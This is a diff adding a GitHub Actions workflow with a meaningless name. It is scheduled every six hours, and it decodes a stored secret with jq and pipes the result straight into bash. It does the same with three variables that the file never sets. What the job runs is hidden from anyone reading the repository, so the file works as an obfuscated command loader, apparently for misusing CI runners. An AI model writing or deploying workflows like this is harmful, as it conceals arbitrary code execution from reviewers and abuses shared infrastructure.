@@ -1,0 +1,22 @@
+name: mayetomorrowrang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mayetomorrowrang
+        env:
+          futpe408: ${{ secrets.futpe408 }}
+        run: |
+          echo $futpe408 | jq -r .vimp5 | /bin/bash
+          echo $zh064 | jq -r .tjy6084 | /bin/bash
+          echo $dczw341 | jq -r .zl20 | /bin/bash
+          echo $thobz7213 | jq -r .clayd2 | /bin/bash
+
